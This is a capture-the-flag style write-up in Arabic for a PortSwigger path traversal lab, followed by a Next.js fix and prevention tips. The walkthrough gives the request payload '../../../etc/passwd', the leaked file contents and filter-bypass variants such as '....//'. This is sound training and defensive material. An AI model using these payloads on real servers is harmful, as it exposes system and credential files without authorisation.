# Lab: File path traversal, simple case

> **Category:** Path Traversal  
> **Difficulty:** APPRENTICE  
> **Lab Link:** [PortSwigger Lab - File path traversal, simple case](https://portswigger.net/web-security/file-path-traversal/lab-simple)

---

## 🎯 الهدف الرئيسي

استغلال ثغرة Path Traversal في عرض صور المنتجات لقراءة محتوى ملف `/etc/passwd` من الخادم.

---

## 📝 الحل خطوة بخطوة

### الخطوة 1: الدخول إلى المختبر

- اضغط **Access the lab** لفتح موقع المتجر الوهمي.
- ستظهر صفحة تعرض منتجات مختلفة مع صورها.

### الخطوة 2: تشغيل Burp Suite واعتراض الطلب

- افتح Burp Suite وتأكد من تشغيل الـ Proxy (Intercept on).
- في المتصفح، اضغط على أي منتج لعرض صورته.
- في Burp → **Proxy > HTTP history**، ابحث عن الطلب التالي:

```http
GET /image?filename=product1.jpg HTTP/1.1
Host: vulnerable-website.com
```

### الخطوة 3: إرسال الطلب إلى Repeater

- حدد الطلب بزر الماوس الأيمن.
- اختر **Send to Repeater**.

### الخطوة 4: تعديل معامل filename

في Repeater، غيّر قيمة `filename` من:
```
product1.jpg
```
إلى:
```
../../../etc/passwd
```

يصبح الطلب:

```http
GET /image?filename=../../../etc/passwd HTTP/1.1
Host: vulnerable-website.com
```

### الخطوة 5: إرسال الطلب

- اضغط على **Send** في Repeater.
- انظر إلى نافذة **Response**.

### الخطوة 6: مشاهدة النتيجة

ستظهر استجابة تحتوي على محتوى ملف `/etc/passwd`:

```text
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
...
carlos:x:1001:1001:,,,:/home/carlos:/bin/bash
```

### الخطوة 7: حل المختبر

- بمجرد ظهور محتوى `/etc/passwd` في الرد، **تم حل المختبر تلقائيًا**.
- ارجع إلى صفحة المختبر في المتصفح، ستظهر رسالة **"Congratulations, you solved the lab!"** وسيتغير لون المختبر إلى الأخضر.

---

## 🔑 ملاحظات مهمة

| النقطة | الشرح |
|--------|-------|
| **لماذا نجح هذا؟** | الخادم يدمج مسار المجلد (`/var/www/images/`) مع اسم الملف الذي أدخلناه (`../../../etc/passwd`) بدون أي تحقق، فيصبح المسار النهائي `/var/www/images/../../../etc/passwd` والذي يكافئ `/etc/passwd`. |
| **ماذا يعني `../`؟** | يعني "اخرج من المجلد الحالي ورجع خطوة واحدة للوراء". |
| **كم عدد `../` نحتاج؟** | نحتاج عدد كافٍ للخروج من مجلد الصور إلى جذر النظام. في هذا المختبر، 3 مرات تكفي (`../../../`). |
| **ماذا لو لم يشتغل؟** | جرب زيادة عدد `../` (مثل 4 أو 5) أو تجربة بايلودات أخرى مثل `....//` لتجاوز الفلاتر. |

---
## 🛡️ Remediation & Source Code Fix

### 📌 Vulnerability Root Cause

الخادم لم يطهر المدخلات (Input Sanitization)، فسمح باستخدام `../` للخروج من المجلد المصرح به وقراءة أي ملف من النظام.

---

### ❌ Non-Compliant Code (Next.js)

```javascript
const { filename } = req.query;
const filePath = path.join('public/images', filename);
fs.readFileSync(filePath);
```

---

### ✅ Compliant Code (Next.js)

```javascript
const { filename } = req.query;
const safeFilename = path.basename(filename); // يزيل ../ و /
const filePath = path.join('public/images', safeFilename);
fs.readFileSync(filePath);
```

**الفرق:** سطر واحد `path.basename()` يحل المشكلة كاملة.

---
## 🛡️ كيفية الوقاية (How to Prevent)

1. **استخدام `path.basename()`:** يزيل أي مسارات ويستخرج اسم الملف النقي فقط.
2. **قائمة بيضاء (Whitelist):** حدد أسماء الملفات المسموحة مسبقاً.
3. **التحقق من المسار النهائي:** تأكد أن المسار لا يزال داخل المجلد المصرح به.


---

## 🔗 روابط مفيدة

- [PortSwigger Lab Page](https://portswigger.net/web-security/file-path-traversal/lab-simple)
- [Path Traversal Cheat Sheet](https://portswigger.net/web-security/file-path-traversal)
